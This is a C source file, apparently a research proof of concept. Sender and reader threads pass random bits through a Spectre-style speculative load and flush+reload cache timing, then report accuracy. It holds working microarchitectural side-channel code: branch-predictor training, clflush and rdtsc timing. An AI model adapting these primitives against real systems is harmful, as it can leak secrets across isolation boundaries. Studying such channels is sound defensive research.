#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <getopt.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <sched.h>

#include "dummy.h"

#define NUMBITS 200

volatile unsigned int brcond;
volatile unsigned int secret;
unsigned int brcheck = 20;
unsigned int __attribute__ ((aligned (512))) array[128];
bool SMT = true;
bool sequence[NUMBITS];

// Cache miss latency threshold
int CACHE_MISS_LATENCY = 160;

static inline void clflush(void *p)
{
  asm volatile ("clflush (%0)" :: "r"(p));
}

/**
 * This function is modified from:
 *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
 */
uint64_t start_time(void)
{
  uint64_t t;
  asm volatile(
    "lfence\n\t"
    "rdtsc\n\t"
    "shl $32, %%rdx\n\t"
    "or %%rdx, %0\n\t"
    "lfence"
    : "=a"(t) /*output*/
    :
    : "rdx", "memory", "cc");
  return t;
}
/**
 * This function is modified from:
 *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
 */
uint64_t stop_time(void)
{
  uint64_t t;
  asm volatile(
    "rdtscp\n\t"
    "shl $32, %%rdx\n\t"
    "or %%rdx, %0\n\t"
    "lfence"
    : "=a"(t) /*output*/
    :
    : "rcx", "rdx", "memory", "cc");
  return t;
}

//This loads the addr and reports the time required to do so.
int maccess(void* addr) {
  volatile uint32_t val;
  volatile unsigned long time;
  __asm__ __volatile__ (
    "mfence \n"
    "rdtsc \n"
    "movl %%eax, %%esi \n"
    "movl (%1), %%eax\n"
    "lfence \n"
    "rdtsc \n"
    "subl %%esi, %%eax \n"
    : "=a" (time)
    : "c" (addr)
    : "%esi", "%edx"
    );
  return time;
}

void setaffinity(int cpu)
{
  cpu_set_t c;

  CPU_ZERO(&c);
  CPU_SET(cpu, &c);

  if (sched_setaffinity(0, sizeof(c), &c) < 0) {
    perror("sched_setaffinity");
    printf("ERROR\n");
    exit(1);
  }
}

void spec_load(void *addr, int loop, bool test) {
  uint32_t val;
  volatile unsigned int *b = &brcond;
  volatile unsigned int *s = &secret;
  unsigned int *c = &brcheck;
  unsigned int *arr = &array[0];
  for (int i = 0; i < loop; ++i) {
    asm(
    R"(
      # Pointer chase *b to delay branch resolution
      # if (*b < *c) {
      movl (%3), %%r11d
      clflush (%2)
      mfence
      lfence
      movl (%2), %%eax
      cmp %%eax, %%r11d
      jle done

      # A = arr[*s]
      mov $0, %%r15
      movl (%4), %%r15d
      shl $2, %%r15d
      add %5, %%r15
      mov (%%r15), %%edx

      # 70 times sum += A
      mov $0, %%ecx
      .REPT 80
        add %%edx, %%ecx
      .ENDR
    )"
    : "=r"(val), "+r"(addr), "+r"(b), "+r"(c), "+r"(s), "+r"(arr)
    :
    : "%r11", "%r15", "%r13", "%eax", "%ebx", "%ecx", "%edx"
    );

  dummy();

  asm(
    R"(
      lfence
      done: movl %%ecx, %0
    )"
    : "=r"(val)
    :
    : "%ecx", "%edx"
    );
  }
}


/* (flag2,flag1):
 * 00: Victim prime BP
 * 01: Attacker flush
 * 10: Victim access
 * 11: Attacker probe
 */
bool flag1=false;
bool flag2 = false;
//#define training_loops 1000000

void* sender()
{
  setaffinity(1);
  dummy();
  void* addr = &dummy;
  uint64_t start = start_time();
  //uint64_t period[NUMBITS+1] = {0};
  for (int i=0; i<NUMBITS; i++) {
    bool one = sequence[i];
    // Synchronize with receiver
    while (flag2 != false || flag1 != false) {}
    //period[i] = start_time();
    //fprintf(stderr,"train");
    brcond = 10;
    secret = 1;
    spec_load((void*)addr, training_loops, false);
    flag1 = true;

    while (flag2 != true || flag1 != false) { }
    brcond = 30;
    /*if (one) {
      //spec_load(addr, 1, false);
      dummy();
    } else {
      clflush(addr);
    }*/
    if (one){
      secret = 40;
      clflush(&array[secret]);
    }
    else {
      secret = 1;
      int v = array[secret];
    }
    //fprintf(stderr,"load");
    spec_load((void*)addr, 1, true);
    flag1 = true;
  }
  uint64_t stop = stop_time();
  //period[NUMBITS] = start_time();
  //for (int i=1; i < NUMBITS+1; i++) {
    //fprintf(stderr, "%ld,", (period[i]-period[i-1]));
  //}
  printf("Avg Period: %ld\n", (stop-start)/NUMBITS);
  printf("Sender finished\n");
}

void* reader()
{
  if (SMT)
    setaffinity(5);
  else
    setaffinity(2);
  dummy();
  void* addr = &dummy;
  int count = 0;
	uint64_t access_time = 0;
  for(int i=0; i<NUMBITS; i++) {
    // Sync with sender
    while (flag2 != false || flag1 != true) { }
    //fprintf(stderr,"flush");
    clflush(addr);
    flag1 = false;
    flag2 = true;
    while (flag2 != true || flag1 != true) { }
    //fprintf(stderr,"reload");
    uint64_t cycles, end;
    asm volatile("rdtsc\n": "=a" (cycles) : : "rcx", "rdx", "memory");
    end = cycles + 0x80000;
    while (cycles < end) {
      asm volatile("rdtsc\n": "=a" (cycles) : : "rcx", "rdx", "memory");
    }

    if (SMT) {
      uint64_t start_t = start_time();
      dummy();
      access_time = stop_time() - start_t;
    } else {
      access_time = maccess(addr);
    }
    bool h_m = access_time > CACHE_MISS_LATENCY;
    if (h_m == sequence[i])
      count++;
    /*else
      fprintf(stderr, "%d (%d)\n", h_m, sequence[i]);*/
    flag1 = false;
    flag2 = false;
  }
  printf("Reader finished with accuracy %d/%d\n", count, NUMBITS);
}

int main(int argc, char **argv) {
  setaffinity(0);

  int one=0, zero=0;
  for(int i=0; i<NUMBITS; i++) {
    sequence[i] = rand()%2;
    if (sequence[i])
      one++;
    else
      zero++;
  }
  printf("ones: %d:%d\n", one, zero);
  if(argc > 1) {
    if(*argv[1] == 'S')
      SMT = true;
    else if(*argv[1] == 'C')
      SMT = false;
    else
      printf("Invalid option: Defaulting to SMT impl.\n");
  }
  secret = 1;
  brcond = 10;
  spec_load(&dummy, 100000, false);
  asm volatile("mfence");
  pthread_t v;
  pthread_t a;
  pthread_create(&v, NULL, sender, NULL);
  pthread_create(&a, NULL, reader, NULL);

  pthread_join(v, NULL);
  pthread_join(a, NULL);
  return 0;
}
